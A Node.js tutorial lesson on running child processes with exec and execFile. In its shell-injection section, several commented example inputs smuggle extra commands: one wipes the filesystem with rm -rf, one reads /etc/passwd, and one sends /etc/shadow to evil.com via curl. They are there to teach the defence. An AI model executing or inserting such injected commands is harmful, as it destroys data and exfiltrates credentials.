# Module 08 / Lesson 03 — Child Processes: exec & execFile

> Sometimes Node.js is not enough. You need to run a shell command, call a system binary, or delegate CPU-heavy work to an external program. The `child_process` module is your gateway — and `exec` and `execFile` are the simplest entry points. They buffer the entire output in memory and hand it to you in a callback. Simple, but full of traps.

---

## Learning Objectives

- Spawn a child process using `exec` and explain why it runs commands through a shell
- Use `execFile` to invoke binaries directly without a shell, and explain the security advantage
- Handle errors, exit codes, and stderr correctly for both functions
- Configure `maxBuffer`, `encoding`, `timeout`, and `cwd` options
- Use the synchronous variants `execSync` and `execFileSync` for scripting and CLI tools

---

## The child_process Module

Node.js provides four ways to create child processes:

| Function | Shell? | I/O Model | Best For |
|----------|--------|-----------|----------|
| `exec` | Yes | Buffered | Short shell commands, piped commands |
| `execFile` | No | Buffered | Running a specific binary safely |
| `spawn` | No (default) | Streaming | Long-running processes, large output |
| `fork` | No | Streaming + IPC | Node.js worker scripts |

This lesson covers `exec` and `execFile`. The next lesson covers `spawn` and `fork`.

---

## exec — Run a Shell Command

`exec` spawns a shell (`/bin/sh` on Unix, `cmd.exe` on Windows) and runs a command string inside it. The child's stdout and stderr are buffered in memory. When the process exits, your callback receives the complete output.

```javascript
'use strict';

const { exec } = require('node:child_process');

exec('ls -la /tmp', (error, stdout, stderr) => {
  if (error) {
    // error.code is the exit code
    // error.signal is the signal that killed the process (if any)
    console.error('Failed:', error.message);
    console.error('Exit code:', error.code);
    return;
  }

  if (stderr) {
    console.error('stderr:', stderr);
  }

  console.log('stdout:', stdout);
});
```

### How exec Works Under the Hood

When you call `exec('ls -la /tmp')`, Node.js does the following:

1. Forks a new child process
2. Launches `/bin/sh -c "ls -la /tmp"` in that process
3. The shell interprets the command string — expanding globs, resolving pipes, processing redirects
4. stdout and stderr are collected into buffers
5. When the process exits, the callback fires with the buffered output

The shell involvement is both the power and the danger of `exec`.

### Shell Features That Work

Because `exec` runs through a shell, you get access to shell features:

```javascript
'use strict';

const { exec } = require('node:child_process');

// Pipes work
exec('cat /etc/hosts | grep localhost', (error, stdout) => {
  if (error) return;
  console.log('Pipe result:', stdout.trim());
});

// Glob expansion works
exec('ls /tmp/*.log 2>/dev/null', (error, stdout) => {
  console.log('Log files:', stdout.trim() || '(none)');
});

// Multiple commands with &&
exec('echo "step 1" && echo "step 2"', (error, stdout) => {
  console.log(stdout);
});

// Environment variable substitution
exec('echo $HOME', (error, stdout) => {
  console.log('Home:', stdout.trim());
});
```

### The Shell Injection Risk

The shell interprets the entire command string. If any part of that string comes from user input, you have a **command injection vulnerability** — one of the most dangerous security flaws in software.

```javascript
'use strict';

const { exec } = require('node:child_process');

// DANGEROUS: Never put user input directly into an exec command string
function dangerousLookup(userInput) {
  // If userInput is "8.8.8.8; rm -rf /", you just wiped the filesystem
  exec(`ping -c 1 ${userInput}`, (error, stdout) => {
    console.log(stdout);
  });
}

// What a malicious user could send:
// dangerousLookup('8.8.8.8; cat /etc/passwd');
// dangerousLookup('$(curl http://evil.com/steal?data=$(cat /etc/shadow))');
// dangerousLookup('8.8.8.8 && rm -rf /');

// RULE: If you use exec, NEVER interpolate user input into the command string.
// Use execFile or spawn instead (covered below and in the next lesson).
```

---

## execFile — Run a Binary Without a Shell

`execFile` invokes a binary directly — no shell, no command string interpretation. Arguments are passed as an array, so they cannot be used for injection.

```javascript
'use strict';

const { execFile } = require('node:child_process');

// Arguments are passed as an array — no shell interpretation
execFile('ls', ['-la', '/tmp'], (error, stdout, stderr) => {
  if (error) {
    console.error('Failed:', error.message);
    return;
  }
  console.log(stdout);
});
```

### Why execFile Is Safer

With `execFile`, each array element is passed as a separate argument to the binary. Shell metacharacters like `;`, `|`, `&&`, `$()`, and backticks are treated as literal characters, not special syntax.

```javascript
'use strict';

const { execFile } = require('node:child_process');

// SAFE: user input is just a single argument to the binary
function safeLookup(userInput) {
  execFile('ping', ['-c', '1', userInput], (error, stdout, stderr) => {
    if (error) {
      console.error('Ping failed:', stderr.trim());
      return;
    }
    console.log(stdout);
  });
}

// Even malicious input is harmless:
// safeLookup('8.8.8.8; rm -rf /');
// ping receives "8.8.8.8; rm -rf /" as a single hostname argument
// It fails because that hostname doesn't exist — but nothing gets deleted
```

### When to Use exec vs execFile

| Use `exec` when... | Use `execFile` when... |
|---------------------|------------------------|
| You need shell features (pipes, globs, redirects) | You are calling a specific binary |
| The command is entirely hardcoded (no user input) | Any part of the arguments comes from external input |
| You are writing a build script or dev tool | You are building a production service |
| The command is short and you trust the source | Security is a concern |

---

## Options Object

Both `exec` and `execFile` accept an options object:

```javascript
'use strict';

const { exec, execFile } = require('node:child_process');

const options = {
  // Working directory for the child process
  cwd: '/tmp',

  // Environment variables (replaces entire environment if set)
  env: { ...process.env, NODE_ENV: 'test' },

  // Encoding for stdout/stderr (default: 'utf8')
  // Set to 'buffer' to receive raw Buffer objects
  encoding: 'utf8',

  // Maximum bytes allowed on stdout/stderr (default: 1 MB)
  maxBuffer: 1024 * 1024 * 10, // 10 MB

  // Kill the child after this many milliseconds
  timeout: 5000,

  // Signal to send when timeout expires (default: 'SIGTERM')
  killSignal: 'SIGTERM',

  // User/group identity for the child process (Unix only)
  // uid: 1000,
  // gid: 1000,

  // Shell to use for exec (default: '/bin/sh' on Unix)
  // shell: '/bin/bash',
};

exec('ls -la', options, (error, stdout) => {
  console.log(stdout);
});
```

### maxBuffer — The Hidden Limit

By default, `exec` and `execFile` allow up to approximately 1 MB of output on stdout and another 1 MB on stderr. If the child produces more, you get an error:

```javascript
'use strict';

const { exec } = require('node:child_process');

// This command produces a LOT of output
exec('find / -type f 2>/dev/null', (error, stdout) => {
  if (error) {
    console.error('Error:', error.message);
    // "stdout maxBuffer length exceeded"
    return;
  }
  console.log(`Lines: ${stdout.split('\n').length}`);
});

// Fix: increase maxBuffer or switch to spawn (streaming)
exec('find / -type f 2>/dev/null', { maxBuffer: 50 * 1024 * 1024 }, (error, stdout) => {
  if (!error) {
    console.log(`Lines: ${stdout.split('\n').length}`);
  }
});
```

The real fix for large output is `spawn` (next lesson), which streams data without buffering everything in memory.

### timeout — Killing Slow Commands

```javascript
'use strict';

const { exec } = require('node:child_process');

// Give the command 2 seconds to complete
exec('sleep 10', { timeout: 2000 }, (error, stdout, stderr) => {
  if (error) {
    console.log('Killed:', error.killed);     // true
    console.log('Signal:', error.signal);      // 'SIGTERM'
    console.log('Exit code:', error.code);     // null (killed, not exited)
  }
});
```

---

## Error Handling

The `error` object in the callback is `null` on success and an `Error` on failure. It carries extra properties:

```javascript
'use strict';

const { exec, execFile } = require('node:child_process');

// Case 1: Command not found
exec('nonexistent_command', (error) => {
  if (error) {
    console.log('Code:', error.code);       // 127
    console.log('Killed:', error.killed);    // false
    console.log('Signal:', error.signal);    // null
    console.log('Message:', error.message);  // Contains stderr
  }
});

// Case 2: Command exits with non-zero code
exec('node -e "process.exit(42)"', (error, stdout, stderr) => {
  if (error) {
    console.log('Exit code:', error.code); // 42
    console.log('stderr:', stderr);
  }
});

// Case 3: Binary not found with execFile
execFile('/nonexistent/binary', [], (error) => {
  if (error) {
    console.log('Error code:', error.code); // 'ENOENT' (not the exit code)
    console.log('Errno:', error.errno);
    console.log('Path:', error.path);
  }
});
```

### Distinguishing Error Types

```javascript
'use strict';

const { execFile } = require('node:child_process');

function runCommand(file, args) {
  execFile(file, args, (error, stdout, stderr) => {
    if (error) {
      if (error.code === 'ENOENT') {
        console.error(`Binary not found: ${file}`);
      } else if (error.code === 'EACCES') {
        console.error(`Permission denied: ${file}`);
      } else if (error.killed) {
        console.error(`Process killed by signal: ${error.signal}`);
      } else if (typeof error.code === 'number') {
        console.error(`Process exited with code ${error.code}`);
        console.error(`stderr: ${stderr}`);
      } else {
        console.error(`Unknown error: ${error.message}`);
      }
      return;
    }

    console.log('Output:', stdout.trim());
  });
}

runCommand('node', ['-e', 'console.log("hello")']);
runCommand('/nonexistent/path', []);
```

---

## Synchronous Variants: execSync and execFileSync

For scripting and CLI tools, the synchronous versions block the event loop until the child process exits. They return stdout directly (or throw on error).

```javascript
'use strict';

const { execSync, execFileSync } = require('node:child_process');

// execSync returns stdout as a Buffer (or string with encoding option)
try {
  const result = execSync('uname -a', { encoding: 'utf8' });
  console.log('System:', result.trim());
} catch (err) {
  console.error('Command failed:', err.status);
  console.error('stderr:', err.stderr);
}

// execFileSync — same but without a shell
try {
  const nodeVersion = execFileSync('node', ['--version'], { encoding: 'utf8' });
  console.log('Node.js version:', nodeVersion.trim());
} catch (err) {
  console.error('Failed:', err.message);
}
```

### When Synchronous Is Appropriate

Synchronous child processes block the entire event loop. Use them only in:

- **CLI tools** — where you are not serving requests and blocking is acceptable
- **Build scripts** — where sequential execution is the goal
- **Startup validation** — checking prerequisites before the server begins accepting connections

Never use them in request handlers, event listeners, or anywhere that serves concurrent operations.

```javascript
'use strict';

const { execFileSync } = require('node:child_process');

// Good: startup validation (runs once, before the server starts)
function validatePrerequisites() {
  const checks = [
    { cmd: 'node', args: ['--version'], name: 'Node.js' },
    { cmd: 'git', args: ['--version'], name: 'Git' },
  ];

  for (const check of checks) {
    try {
      const version = execFileSync(check.cmd, check.args, {
        encoding: 'utf8',
        timeout: 5000
      }).trim();
      console.log(`  ${check.name}: ${version}`);
    } catch {
      console.error(`  ${check.name}: NOT FOUND`);
      process.exit(1);
    }
  }
}

console.log('Checking prerequisites:');
validatePrerequisites();
console.log('All prerequisites met.');
```

---

## Promise Wrappers

`exec` and `execFile` use the callback pattern. You can promisify them with `util.promisify`:

```javascript
'use strict';

const { exec, execFile } = require('node:child_process');
const { promisify } = require('node:util');

const execAsync = promisify(exec);
const execFileAsync = promisify(execFile);

async function main() {
  try {
    // exec with promises
    const { stdout: lsOutput } = await execAsync('ls -la /tmp');
    console.log('Directory listing:\n', lsOutput);

    // execFile with promises
    const { stdout: nodeVer } = await execFileAsync('node', ['--version']);
    console.log('Node version:', nodeVer.trim());
  } catch (err) {
    console.error('Failed:', err.message);
    console.error('Exit code:', err.code);
    console.error('stderr:', err.stderr);
  }
}

main();
```

### Building a Command Runner Utility

```javascript
'use strict';

const { execFile } = require('node:child_process');
const { promisify } = require('node:util');

const execFileAsync = promisify(execFile);

async function run(file, args = [], options = {}) {
  const defaults = {
    encoding: 'utf8',
    timeout: 30_000,
    maxBuffer: 5 * 1024 * 1024 // 5 MB
  };

  const startTime = process.hrtime.bigint();

  try {
    const { stdout, stderr } = await execFileAsync(file, args, {
      ...defaults,
      ...options
    });

    const duration = Number(process.hrtime.bigint() - startTime) / 1_000_000;

    return {
      success: true,
      stdout: stdout.trimEnd(),
      stderr: stderr.trimEnd(),
      durationMs: duration
    };
  } catch (err) {
    const duration = Number(process.hrtime.bigint() - startTime) / 1_000_000;

    return {
      success: false,
      exitCode: err.code,
      signal: err.signal,
      killed: err.killed,
      stdout: (err.stdout || '').trimEnd(),
      stderr: (err.stderr || '').trimEnd(),
      durationMs: duration
    };
  }
}

async function main() {
  const result = await run('node', ['-e', 'console.log("hello"); console.error("debug")']);
  console.log(result);
  // { success: true, stdout: 'hello', stderr: 'debug', durationMs: 52.3 }

  const fail = await run('node', ['-e', 'process.exit(1)']);
  console.log(fail);
  // { success: false, exitCode: 1, ... }
}

main();
```

---

## Practical Example: A System Info Collector

```javascript
'use strict';

const { execFile } = require('node:child_process');
const { promisify } = require('node:util');

const execFileAsync = promisify(execFile);

async function collectSystemInfo() {
  const info = {};

  // Helper: run a command and return trimmed stdout
  async function cmd(file, args) {
    try {
      const { stdout } = await execFileAsync(file, args, {
        encoding: 'utf8',
        timeout: 5000
      });
      return stdout.trim();
    } catch {
      return 'unavailable';
    }
  }

  info.hostname = await cmd('hostname', []);
  info.kernel = await cmd('uname', ['-r']);
  info.arch = await cmd('uname', ['-m']);
  info.nodeVersion = await cmd('node', ['--version']);
  info.uptime = await cmd('uptime', []);
  info.whoami = await cmd('whoami', []);

  // Disk usage (this is platform-specific)
  if (process.platform !== 'win32') {
    info.disk = await cmd('df', ['-h', '/']);
  }

  return info;
}

collectSystemInfo().then((info) => {
  console.log('System Information:');
  console.log(JSON.stringify(info, null, 2));
});
```

---

## Key Takeaways

- `exec` runs commands through a shell, giving you pipes, globs, and redirects — but never interpolate user input into the command string or you create a command injection vulnerability.
- `execFile` invokes a binary directly with arguments as an array, eliminating shell interpretation and making it the safe choice for production code.
- Both functions buffer the entire stdout and stderr in memory (default limit ~1 MB); for large output, increase `maxBuffer` or switch to `spawn`.
- The synchronous variants (`execSync`, `execFileSync`) are appropriate for CLI tools and startup checks but must never be used in request handlers.
- Promisify `exec` and `execFile` with `util.promisify` to use them with async/await in modern codebases.

---

## Next

In the next lesson you will learn `spawn` and `fork` — child process methods that stream I/O instead of buffering it, and that open IPC channels for direct communication between parent and child.
